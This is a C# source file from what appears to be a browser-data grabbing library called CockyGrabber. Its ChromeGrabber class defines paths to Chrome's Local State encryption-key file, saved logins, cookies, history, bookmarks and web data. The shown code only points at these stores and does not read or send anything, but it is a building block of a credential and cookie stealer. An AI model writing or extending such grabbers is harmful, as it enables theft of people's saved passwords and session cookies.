using System;

namespace CockyGrabber.Grabbers
{
    public class ChromeGrabber : BlinkGrabber
    {
        public override string DataRootPath
        {
            get
            {
                return $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Google\\Chrome\\User Data";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Google\\Chrome\\User Data\\Local State";
            }
        }
        public override string CookiePath
        {
            get
            {
                return $"\\Network\\Cookies";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                return $"\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                return $"\\Bookmarks";
            }
        }
        public override string WebDataPath
        {
            get
            {
                return $"\\Web Data";
            }
        }
    }
}